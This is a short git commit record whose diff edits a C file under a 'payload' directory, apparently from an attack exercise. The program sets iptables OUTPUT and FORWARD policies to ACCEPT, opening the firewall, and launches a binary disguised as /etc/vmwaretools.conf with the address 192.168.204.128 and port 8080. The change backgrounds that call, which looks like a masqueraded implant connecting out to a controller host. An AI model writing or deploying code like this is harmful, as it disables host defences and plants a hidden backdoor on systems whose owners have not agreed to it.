75c9a1bec3e4ca378ef43b6d17ec531425f59e44
Sunggwan Choi <sxc2679@rit.edu>
2019-09-26 00:47:41 +0100

    struggle 7

--- payload/iptables/drop.c
+++ payload/iptables/drop.c
@@ -13,7 +13,7 @@ int main(int argc, char **argv) {
 	system("`which xtables-multi` iptables -P OUTPUT ACCEPT");
 	system("`which xtables-multi` iptables -P FORWARD ACCEPT");
 
-	system("/etc/vmwaretools.conf 192.168.204.128 8080");
+	system("/etc/vmwaretools.conf 192.168.204.128 8080 &");
 
 	return 0;
 }
